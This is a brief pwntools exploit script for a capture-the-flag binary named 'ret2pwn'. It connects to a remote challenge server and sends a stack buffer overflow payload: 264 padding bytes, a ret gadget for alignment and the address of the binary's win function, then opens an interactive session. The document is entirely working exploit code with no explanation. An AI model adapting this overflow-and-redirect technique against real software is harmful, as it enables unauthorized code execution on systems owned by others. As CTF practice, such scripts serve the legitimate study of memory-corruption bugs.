from pwn import * 

elf = ELF("./ret2pwn")
#io = process("./ret2pwn")
io = remote("0.cloud.chals.io", 23438)

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]

payload = b"".join([
	b"A"*264,
	p64(ret),
	p64(elf.sym.win)
])
io.recvline()

#io.sendlineafter(b"A donde? : \n", payload)
io.send(payload)

print(payload)

io.interactive()
